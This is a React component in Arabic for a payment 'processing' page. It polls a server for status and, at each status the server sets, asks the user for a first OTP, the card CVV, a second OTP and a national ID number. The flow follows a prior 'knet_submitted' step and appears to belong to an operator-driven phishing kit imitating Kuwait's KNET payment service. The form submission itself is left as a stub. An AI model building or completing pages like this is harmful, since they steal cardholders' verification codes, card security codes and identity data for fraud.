import { useEffect, useState } from "react";
import { useLocation } from "wouter";

export default function Loading() {
  const [location, setLocation] = useLocation();
  const [status, setStatus] = useState("جاري المعالجة...");
  const [paymentId, setPaymentId] = useState<string | null>(null);
  const [currentStage, setCurrentStage] = useState<string>("loading");
  const [formData, setFormData] = useState<Record<string, string>>({});

  useEffect(() => {
    // Get paymentId from URL params
    const params = new URLSearchParams(window.location.search);
    const id = params.get("paymentId");
    if (id) {
      setPaymentId(id);
    }
  }, []);

  useEffect(() => {
    if (!paymentId) return;

    const pollStatus = async () => {
      try {
        const response = await fetch(`/api/trpc/payment.getPaymentStatus?input=${JSON.stringify({ paymentId })}`);
        const data = await response.json();

        if (data.result?.data?.status) {
          const status = data.result.data.status;

          // Update the current stage based on status
          if (status === "otp1_pending") {
            setCurrentStage("otp1");
          } else if (status === "cvv_pending") {
            setCurrentStage("cvv");
          } else if (status === "otp2_pending") {
            setCurrentStage("otp2");
          } else if (status === "hawety_pending") {
            setCurrentStage("hawety");
          } else if (status === "completed") {
            setLocation(`/success?paymentId=${paymentId}`);
          } else if (status === "rejected") {
            setLocation(`/error?paymentId=${paymentId}`);
          }

          setStatus(getStatusMessage(status));
        }
      } catch (error) {
        console.error("Error polling status:", error);
      }
    };

    // Poll every 2 seconds
    const interval = setInterval(pollStatus, 2000);

    // Initial poll
    pollStatus();

    return () => clearInterval(interval);
  }, [paymentId, setLocation]);

  const getStatusMessage = (status: string) => {
    const messages: Record<string, string> = {
      knet_submitted: "جاري التحقق من بيانات البطاقة...",
      otp1_pending: "جاري إرسال رمز التحقق...",
      otp1_verified: "تم التحقق من الرمز الأول...",
      cvv_pending: "جاري التحقق من رمز CVV...",
      cvv_verified: "تم التحقق من CVV...",
      otp2_pending: "جاري إرسال رمز التحقق الثاني...",
      otp2_verified: "تم التحقق من الرمز الثاني...",
      hawety_pending: "جاري التحقق من بيانات الهوية...",
      completed: "تم إكمال العملية بنجاح...",
      rejected: "تم رفض العملية...",
    };
    return messages[status] || "جاري المعالجة...";
  };

  const handleFormSubmit = async (e: React.FormEvent, stage: string) => {
    e.preventDefault();
    // Form submission logic would go here
    console.log(`Submitted ${stage}:`, formData);
  };

  // Loading screen
  if (currentStage === "loading") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full text-center">
          <div className="mb-6">
            <div className="inline-block">
              <div className="relative w-16 h-16">
                <div className="absolute inset-0 bg-gradient-to-r from-blue-400 to-indigo-600 rounded-full animate-spin"></div>
                <div className="absolute inset-1 bg-white rounded-full"></div>
              </div>
            </div>
          </div>

          <h1 className="text-2xl font-bold text-gray-800 mb-4">جاري المعالجة</h1>
          <p className="text-gray-600 mb-4">{status}</p>

          <div className="space-y-2">
            <div className="flex items-center justify-center gap-2">
              <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce"></div>
              <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0.2s" }}></div>
              <div className="w-2 h-2 bg-blue-500 rounded-full animate-bounce" style={{ animationDelay: "0.4s" }}></div>
            </div>
          </div>

          <p className="text-sm text-gray-500 mt-6">يرجى عدم إغلاق هذه الصفحة</p>
        </div>
      </div>
    );
  }

  // OTP Form (Stage 1)
  if (currentStage === "otp1" || currentStage === "otp2") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-gray-800">التحقق من الرمز</h1>
            <p className="text-gray-600 text-sm mt-2">أدخل رمز التحقق المرسل إلى هاتفك</p>
          </div>

          <form onSubmit={(e) => handleFormSubmit(e, currentStage)}>
            <div className="mb-4">
              <label className="block text-gray-700 font-semibold mb-2">رمز التحقق</label>
              <input
                type="text"
                placeholder="000000"
                maxLength={6}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                value={formData.otp || ""}
                onChange={(e) => setFormData({ ...formData, otp: e.target.value })}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
            >
              تأكيد
            </button>
          </form>
        </div>
      </div>
    );
  }

  // CVV Form
  if (currentStage === "cvv") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-gray-800">التحقق من CVV</h1>
            <p className="text-gray-600 text-sm mt-2">أدخل رمز CVV من ظهر بطاقتك</p>
          </div>

          <form onSubmit={(e) => handleFormSubmit(e, "cvv")}>
            <div className="mb-4">
              <label className="block text-gray-700 font-semibold mb-2">رمز CVV</label>
              <input
                type="text"
                placeholder="000"
                maxLength={4}
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                value={formData.cvv || ""}
                onChange={(e) => setFormData({ ...formData, cvv: e.target.value })}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
            >
              تأكيد
            </button>
          </form>
        </div>
      </div>
    );
  }

  // Hawety Form
  if (currentStage === "hawety") {
    return (
      <div className="min-h-screen bg-gradient-to-br from-blue-50 to-indigo-100 flex items-center justify-center p-4">
        <div className="bg-white rounded-lg shadow-lg p-8 max-w-md w-full">
          <div className="text-center mb-6">
            <h1 className="text-2xl font-bold text-gray-800">التحقق من الهوية</h1>
            <p className="text-gray-600 text-sm mt-2">أدخل رقم هويتك</p>
          </div>

          <form onSubmit={(e) => handleFormSubmit(e, "hawety")}>
            <div className="mb-4">
              <label className="block text-gray-700 font-semibold mb-2">رقم الهوية</label>
              <input
                type="text"
                placeholder="123456789"
                className="w-full px-4 py-2 border border-gray-300 rounded-lg focus:outline-none focus:ring-2 focus:ring-blue-500"
                value={formData.hawety || ""}
                onChange={(e) => setFormData({ ...formData, hawety: e.target.value })}
                required
              />
            </div>

            <button
              type="submit"
              className="w-full bg-blue-600 text-white py-2 rounded-lg font-semibold hover:bg-blue-700 transition"
            >
              تأكيد
            </button>
          </form>
        </div>
      </div>
    );
  }

  return null;
}
